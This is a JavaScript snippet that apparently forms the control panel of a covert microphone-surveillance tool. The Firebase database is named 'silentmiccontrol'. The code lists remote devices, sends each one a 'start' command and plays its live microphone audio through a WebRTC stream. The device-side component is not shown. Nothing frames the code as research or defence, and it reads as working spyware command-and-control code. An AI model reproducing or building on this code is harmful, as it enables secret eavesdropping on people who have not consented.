<script>
const firebaseConfig = {
  databaseURL: "https://silentmiccontrol-default-rtdb.firebaseio.com"
};
firebase.initializeApp(firebaseConfig);
const db = firebase.database();

const deviceListDiv = document.getElementById("deviceList");
const audioElement = document.getElementById("remoteAudio");
const statusDiv = document.getElementById("connectedStatus");

db.ref("devices").once("value").then(snapshot => {
  const devices = snapshot.val();
  deviceListDiv.innerHTML = "";

  if (!devices) {
    deviceListDiv.textContent = "No devices online.";
    console.warn("No devices found in Firebase");
    return;
  }

  Object.entries(devices).forEach(([deviceId, deviceData]) => {
    console.log("Device found:", deviceId, deviceData);
    const deviceName = deviceData?.info?.name || deviceId;

    const deviceCard = document.createElement("div");
    deviceCard.className = "device";

    const label = document.createElement("span");
    label.textContent = `Device: ${deviceName}`;

    const button = document.createElement("button");
    button.textContent = "▶️ Listen";
    button.onclick = () => listenToDevice(deviceId);

    deviceCard.appendChild(label);
    deviceCard.appendChild(button);
    deviceListDiv.appendChild(deviceCard);
  });
});

function listenToDevice(deviceId) {
  deviceListDiv.innerHTML = `<b>Connecting to ${deviceId}...</b>`;
  statusDiv.textContent = "";

  const liveRef = db.ref(`live_audio/${deviceId}`);
  liveRef.child("command").set("start");

  const peer = new SimplePeer({ initiator: false, trickle: false });

  peer.on("signal", data => {
    liveRef.child("webrtc/answer").set({
      type: data.type,
      description: data.sdp
    });
  });

  liveRef.child("webrtc/offer").on("value", snapshot => {
    const offer = snapshot.val();
    if (offer && offer.type && offer.description) {
      peer.signal({ type: offer.type, sdp: offer.description });
    }
  });

  liveRef.child("webrtc/candidate").on("child_added", snap => {
    const candidate = snap.val();
    if (candidate) {
      peer.signal({
        candidate: candidate.sdp,
        sdpMid: candidate.sdpMid,
        sdpMLineIndex: candidate.sdpMLineIndex
      });
    }
  });

  peer.on("stream", stream => {
    audioElement.srcObject = stream;
    audioElement.style.display = "block";
    audioElement.play();
    statusDiv.innerHTML = `✅ Now listening to <b>${deviceId}</b>`;
  });

  peer.on("error", err => {
    console.error("Peer error", err);
    statusDiv.innerHTML = `❌ Error connecting to <b>${deviceId}</b>`;
  });
}
</script>
